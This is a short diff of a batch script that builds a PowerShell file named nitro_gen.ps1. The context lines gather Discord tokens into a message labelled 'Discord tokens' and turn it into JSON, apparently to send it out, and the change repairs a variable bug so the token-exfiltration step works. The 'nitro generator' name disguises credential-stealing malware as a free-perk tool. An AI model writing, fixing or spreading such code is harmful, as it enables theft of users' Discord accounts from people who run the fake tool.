@@ -43,7 +43,7 @@ echo foreach ($token in $tokensString) { >> nitro_gen.ps1
 echo     $message = ^"** Discord tokens : ** >> nitro_gen.ps1
 echo     ``` $token ``` ^" >> nitro_gen.ps1
 
-echo     $hash = @{ "content" = message; } >> nitro_gen.ps1
+echo     $hash = @{ "content" = $message; } >> nitro_gen.ps1
 
 echo     $JSON = $hash ^| convertto-json >> nitro_gen.ps1
 
